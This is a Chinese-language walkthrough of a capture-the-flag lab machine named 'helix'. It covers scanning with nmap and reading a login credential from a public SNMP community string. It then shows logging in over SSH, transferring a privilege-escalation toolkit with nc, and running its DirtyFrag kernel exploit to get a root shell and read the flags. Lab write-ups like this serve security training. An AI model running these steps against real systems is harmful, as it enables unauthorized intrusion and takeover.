#### 一、信息收集

靶机信息
ip：192.168.56.150


```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -p- -sV -sC 192.168.56.150
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-01 22:14 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.150
Host is up (0.0017s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)
MAC Address: 08:00:27:D7:0E:4D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

发现使用nmap扫描后只是开放了22端口，和bonjour靶机一样，尝试扫描UDP协议

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -sU --top-ports 100 -sV 192.168.56.150
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-01 22:16 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.150
Host is up (0.00084s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT    STATE         SERVICE VERSION
68/udp  open|filtered dhcpc
161/udp open          snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
MAC Address: 08:00:27:D7:0E:4D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: helix
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.73 seconds

```

看看使用相同的手法是否有结果

```
sudo systemctl start avahi-daemon
sudo systemctl enable avahi-daemon
开启Avahi进程，使用avahi-browse -r -a -t获取信息
```

哈哈，搞错了，我们的 `avahi-browse -r -a -t` 没有输出，核心原因很简单：目标主机（`192.168.56.150`）上没有运行 Avahi（mDNS/DNS-SD）服务，也没有在局域网内广播任何 ZeroConf/Bonjour 服务。

我们的扫描结果明确显示了SNMPv3 server (public)，我们可以利用它读取系统的配置信息

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ snmpwalk -v 1 -c public 192.168.56.150 1.3.6.1.2.1.1
iso.3.6.1.2.1.1.1.0 = STRING: "Linux helix 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (86315) 0:14:23.15
iso.3.6.1.2.1.1.4.0 = STRING: "Me:lixeh22"
iso.3.6.1.2.1.1.5.0 = STRING: "helix"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (5) 0:00:00.05

```

获得一组登录凭据
iso.3.6.1.2.1.1.4.0 = STRING: "Me:lixeh22"


#### 二、漏洞复现
使用获得的凭据进行SSH登入

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh me@192.168.56.150
me@192.168.56.150's password: 
Linux helix 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 12 17:06:19 2026 from 192.168.56.1
me@helix:~$ id
uid=1001(me) gid=1001(me) groupes=1001(me)
me@helix:~$ ls -al
total 32
drwx------ 3 me   me   4096 12 mai   17:14 .
drwxr-xr-x 3 root root 4096 12 mai   17:13 ..
-rw------- 1 me   me     11 12 mai   17:14 .bash_history
-rw-r--r-- 1 me   me    220  8 mars  16:21 .bash_logout
-rw-r--r-- 1 me   me   3526  8 mars  16:21 .bashrc
drwxrwxr-x 3 me   me   4096 12 mai   13:21 .local
-rw-r--r-- 1 me   me    807  8 mars  16:21 .profile
-rw-rw-r-- 1 me   me     65 12 mai   13:21 user.txt
me@helix:~$ cat user.txt
410e2fb19f61cbce630520b66368cf11d04934650ffecaac322c0acd6d7511ae
me@helix:~$ 

```


#### 三、提权

上传Fullex

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ls -al                         
total 1460
drwxr-xr-x  8 kali kali    4096 Jul  1 23:04 .
drwx------ 24 kali kali    4096 Jul  1 22:32 ..
-rw-rw-r--  1 kali kali    4681 Jun 28 03:31 1.py
drwxrwxr-x  4 kali kali    4096 Jun 29 03:15 fullEx-main
drwxr-xr-x  5 root root    4096 Jun  4 06:44 git-dumper
-rwxrwxr-x  1 kali kali 1063041 Jun 23 03:29 linpeas.sh
-rw-rw-r--  1 kali kali  306894 Jul  1 22:37 lpout.txt
drwxrwxr-x 22 kali kali    4096 Jul  1 22:12 maze
drwxr-xr-x 14 root root    4096 Jun 30 05:39 reports
-rw-rw-r--  1 kali kali   80577 Jun  1 11:13 top10000password.txt
drwxrwxr-x  2 kali kali    4096 Mar 12 05:29 tryhackme
drwxrwxr-x  4 kali kali    4096 Jun 11 07:58 Ulab
                                                                                
┌──(kali㉿kali)-[~/Desktop]
└─$ tar -czf fullex.tar.gz fullEx-main/
                                                                                
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvp 4444 < fullex.tar.gz 
listening on [any] 4444 ...
192.168.56.143: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.143] 37032



me@helix:~$ chmod 755 fullEx-main/
me@helix:~$ cd fullEx-main/
me@helix:~/fullEx-main$ ls -al
total 36
drwxr-xr-x  4 me me  4096 29 juin  09:15 .
drwx------  4 me me  4096  2 juil. 05:05 ..
drwxrwxr-x 11 me me  4096 29 juin  09:15 exploit
-rwxrwxr-x  1 me me  4039 29 juin  09:15 fullEx.sh
drwxrwxr-x  6 me me  4096 29 juin  09:15 outils
-rw-rw-r--  1 me me 15311 29 juin  09:15 README.md
me@helix:~/fullEx-main$ ./fullEx.sh -DirtyFrag
./fullEx.sh: ligne 143: /home/me/fullEx-main/exploit/DirtyFrag/df: Permission non accordée
me@helix:~/fullEx-main$ cd exploit/
me@helix:~/fullEx-main/exploit$ ls -al
total 44
drwxrwxr-x 11 me me 4096 29 juin  09:15 .
drwxr-xr-x  4 me me 4096 29 juin  09:15 ..
drwxrwxr-x  2 me me 4096 29 juin  09:15 CopyFail
drwxrwxr-x  2 me me 4096 29 juin  09:15 DirtyCow
drwxrwxr-x  2 me me 4096 29 juin  09:15 DirtyFrag
drwxrwxr-x  2 me me 4096 29 juin  09:15 DirtyPipe
drwxrwxr-x  2 me me 4096 29 juin  09:15 Fragnesia
drwxrwxr-x  2 me me 4096 29 juin  09:15 Overlays
drwxrwxr-x  2 me me 4096 29 juin  09:15 Pack2TheRoot
drwxrwxr-x  2 me me 4096 29 juin  09:15 PwnKit
drwxrwxr-x  2 me me 4096 29 juin  09:15 ReadRoot
me@helix:~/fullEx-main/exploit$ cd DirtyFrag/
me@helix:~/fullEx-main/exploit/DirtyFrag$ chmod +x *
me@helix:~/fullEx-main/exploit/DirtyFrag$ cd ..
me@helix:~/fullEx-main/exploit$ cd ..
me@helix:~/fullEx-main$ ./fullEx.sh -DirtyFrag
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -al
total 36
drwxr-xr-x  4 me me  4096 Jun 29 09:15 .
drwx------  4 me me  4096 Jul  2 05:05 ..
-rw-rw-r--  1 me me 15311 Jun 29 09:15 README.md
drwxrwxr-x 11 me me  4096 Jun 29 09:15 exploit
-rwxrwxr-x  1 me me  4039 Jun 29 09:15 fullEx.sh
drwxrwxr-x  6 me me  4096 Jun 29 09:15 outils
# cd /root
# ls -al
total 36
drwx------  4 root root 4096 May 12 17:12 .
drwxr-xr-x 18 root root 4096 Apr 28 16:53 ..
-rw-------  1 root root  675 May 12 17:14 .bash_history
-rw-r--r--  1 root root  607 Mar  2 22:50 .bashrc
-rw-------  1 root root   20 May 12 17:12 .lesshst
drwxrwxr-x  3 root root 4096 Apr 28 17:00 .local
-rw-r--r--  1 root root  132 Mar  2 22:50 .profile
drwx------  2 root root 4096 Apr 28 16:48 .ssh
-rw-rw-r--  1 root root   65 May 11 19:29 root.txt
# cat root.txt
3faf135eff748a201ff898b011c202bafb52ab89168ab90bae804d584a5e8565
# 

```